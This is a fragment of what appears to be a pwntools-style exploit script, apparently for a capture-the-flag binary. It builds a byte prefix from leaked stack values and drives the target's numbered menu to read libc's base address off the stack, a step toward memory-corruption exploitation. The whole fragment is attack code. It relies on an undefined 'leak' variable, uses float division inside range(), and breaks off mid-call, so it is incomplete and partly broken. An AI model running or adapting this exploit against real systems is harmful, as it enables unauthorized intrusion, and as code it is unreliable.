from _struct import Struct
s = Struct.__new__(Struct)
s.__init__('=I')

prefix = b''
for i in range(0x78/4, 0x88/4):
    prefix += s.pack(leak[i])

prefix = prefix[:6] + b'\0\0'

# now that we have the address of the libc's prefix...
# let's use the echo server to read the libc's base address off the stack

io.sendlineafter('> ', str(9))
io.sendlineafter(': ', str(len(prefix)))
io.sendline(prefix)
io.sendlineafter('> ', str(0x10))

io.sendlineafter('> ', str(5))
io.sendlineafter('> ', str(9))
io.sendlineafter(': ', str(0x10))
io.sendlineafter('> ', str(0x10))

io.sendlineafter('> ', str(4))
io.sendlineafter('> ', str(6))
io.sendlineafter(': ', str(0x10))
io.sendline
